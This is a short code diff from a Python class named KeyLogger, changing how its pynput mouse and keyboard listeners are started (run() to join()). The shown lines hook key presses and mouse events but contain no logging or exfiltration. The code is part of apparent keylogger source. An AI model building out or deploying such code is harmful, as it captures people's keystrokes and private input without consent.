@@ -42,7 +42,7 @@ class KeyLogger():
     def main(self):
         with mouse.Listener(on_move=self.on_move, on_click=self.on_click) as m_listener, \
             keyboard.Listener(on_release=self.on_release, on_press=self.on_press,) as k_listener:  
-                m_listener.run()
+                m_listener.join()
                 k_listener.run()
 
 
